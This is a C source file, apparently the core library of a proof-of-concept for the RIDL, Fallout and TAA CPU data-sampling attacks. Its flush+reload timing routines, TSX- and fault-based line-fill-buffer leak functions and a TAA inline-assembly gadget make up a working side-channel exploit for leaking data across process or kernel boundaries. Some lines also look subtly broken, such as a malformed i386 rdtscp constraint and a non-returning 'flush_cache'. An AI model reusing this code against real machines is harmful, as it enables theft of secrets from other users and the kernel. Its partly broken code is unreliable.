#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sched.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/mman.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>

#if defined(__x86_64__)
int fallout_compatible(){return 1;}
#elif defined(__i386__)
int fallout_compatible(){return 1;}
#else

int fallout_compatible() { return 0; }

#endif

ssize_t page_size;
jmp_buf buf;
void *ptr = NULL;
int cache_hit_timing = 150, use_taa = 0;

#ifdef TSX_AVAILABLE
static __attribute__((always_inline)) inline unsigned int xbegin(void) {
    unsigned status;
    asm volatile("xbegin 1f \n 1:" : "=a"(status) : "a"(-1UL) : "memory");
    //asm volatile(".byte 0xc7,0xf8,0x00,0x00,0x00,0x00" : "=a"(status) : "a"(-1UL) : "memory");
    return status == ~0u;
}
static __attribute__((always_inline)) inline void xend(void) {
    asm volatile("xend" ::: "memory");
    //asm volatile(".byte 0x0f; .byte 0x01; .byte 0xd5" ::: "memory");
}
#endif

static inline void __attribute__((always_inline)) flush(void *p) {
    asm volatile("clflush (%0)\n" : : "r"(p));
}

static inline void __attribute__((always_inline)) flush_mem(void *mem) {
    for (int i = 0; i < 256; i++) {
        flush(mem + page_size * (((i * 167) + 13) & 0xFF));
    }
    asm volatile("mfence");
}

static inline void __attribute__((always_inline)) maccess(void *p) {
#ifdef __x86_64__
    asm volatile("movq (%0), %%rax\n" : : "r"(p) : "rax");
#else
    asm volatile("movl (%0), %%eax\n" : : "r"(p) : "eax");
#endif
}

static inline uint64_t rdtsc() {
    uint64_t a = 0, d = 0;
    asm volatile("mfence");
#if defined(USE_RDTSCP) && defined(__x86_64__)
    asm volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");
#elif defined(USE_RDTSCP) && defined(__i386__)
    asm volatile("rdtscp" : "=A"(a), :: "ecx");
#elif defined(__x86_64__)
    asm volatile("rdtsc" : "=a"(a), "=d"(d));
#elif defined(__i386__)
    asm volatile("rdtsc" : "=A"(a));
#endif
    a = (d << 32) | a;
    asm volatile("mfence");
    return a;
}

static inline uint64_t rdtscp() {
    uint64_t a, d;
#if defined(__x86_64__)
    asm volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");
#elif defined(__i386__)
    asm volatile("rdtscp" : "=A"(a), :: "ecx");
#endif
    return (d << 32) | a;
}

static inline uint64_t __attribute__((always_inline)) measure_flush_reload(void *ptr) {
    uint64_t start = 0, end = 0;
    start = rdtsc();
    maccess(ptr);
    end = rdtsc();
    flush(ptr);
    return end - start;
}

static inline uint64_t __attribute__((always_inline)) measure_access_time(void *ptr) {
    asm volatile("mfence");
    uint64_t t = rdtscp();
    maccess(ptr);
    t = rdtscp() - t;
    return t;
}


static void unblock_signal(int signum __attribute__((__unused__))) {
    sigset_t sigs;
    sigemptyset(&sigs);
    sigaddset(&sigs, signum);
    sigprocmask(SIG_UNBLOCK, &sigs, NULL);
}

static void segfault_handler(int signum) {
    (void) signum;
    unblock_signal(SIGSEGV);
    longjmp(buf, 1);
}

static inline int get_cache_timing() {
    int ret = 0;
    uint64_t * page = aligned_alloc(page_size, page_size);
    page[0] = 42;
    asm volatile("mfence");
    for(int i = 0; i < 2000; i++) {
        flush(page);
        asm volatile("mfence");
        ret += (int) measure_access_time(page) / 2;
    }
    free(page);
    return ret / 3500;
}


static inline int get_min(uint64_t *buffer, int len) {
    int min_i = 0, i = 0;
    uint64_t min = UINT64_MAX;
    for (; i < len; i++) {
        if (buffer[i] < min) {
            min = buffer[i];
            min_i = i;
        }
    }
    return min_i;
}


int flush_cache(void *mem) {
    flush_mem(mem);
}

#ifdef TSX_AVAILABLE

uint8_t* flush_buffer;

static inline __attribute__((always_inline)) void lfb_leak(void* mem, uint8_t* ptr){
    if(xbegin()){maccess(mem + page_size * (*ptr)); xend();}
    //asm volatile("mfence\n");
}

static inline __attribute__((always_inline)) int lfb_read_basic(void *mem) {
    int i = 0;
    flush_mem(mem);
    lfb_leak(mem, ptr);
    for (; i < 256; i++) {
        uint64_t t = measure_access_time(mem + page_size * i);
        if (t < cache_hit_timing) return i;
    }
    return -1;
}

static inline __attribute__((always_inline)) void lfb_leak_taa(void* mem, uint8_t* ptr){
    uint64_t local;
    asm volatile(
            "clflush (%0)\n"
            "sfence\n"
            "clflush (%1)\n"
            "xbegin 1f\n"
            "movq (%0), %2\n"
            "shlq $0xC, %2\n"
            "movq (%1, %2), %2\n"
            "xend\n"
            "1:\n"
            ::"r"(ptr), "r"(mem), "r"(local));
}

static inline __attribute__((always_inline)) int lfb_read_taa(void *mem) {
    int i = 0;
    flush_mem(mem);
    lfb_leak_taa(mem, flush_buffer);
    for (; i < 256; i++) {
        uint64_t t = measure_access_time(mem + page_size * i);
        if (t < cache_hit_timing) return i;
    }
    return -1;
}

int lfb_read(void *mem) {
    if(!use_taa) return lfb_read_basic(mem);
    return lfb_read_taa(mem);
}
#else

static inline __attribute__((always_inline)) void lfb_leak(void *mem, uint8_t *ptr) {
    maccess(mem + page_size * (*ptr));
}

int lfb_read(void *mem) {
    int i = 0;
    if (!setjmp(buf)) {
        flush_mem(mem);
        lfb_leak(mem, (uint8_t *) ptr);
    }
    for (; i < 256; i++) {
        uint64_t t = measure_access_time(mem + page_size * i);
        if (t < cache_hit_timing) return i;
    }
    return -1;
}

#endif

/**
 * Init function, should be called before any other function from this file is used
 */
int ridl_init(int argc, char** args) {
    page_size = getpagesize();
    cache_hit_timing = get_cache_timing();
#ifndef TSX_AVAILABLE
    printf("Not using Intel TSX! Setting up signal handler...\n");
    if (signal(SIGSEGV, segfault_handler) == SIG_ERR) {
        printf("%s", "Failed to setup signal handler\n");
        return 0;
    }
#else
    if(argc > 1){
        use_taa = !strcmp(args[1], "--taa");
    }
    flush_buffer = mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0);
#endif
    fflush(stdout);
    return 1;
}

/**
 * Cleanup function, should be called after use
 */
void ridl_cleanup() {

}
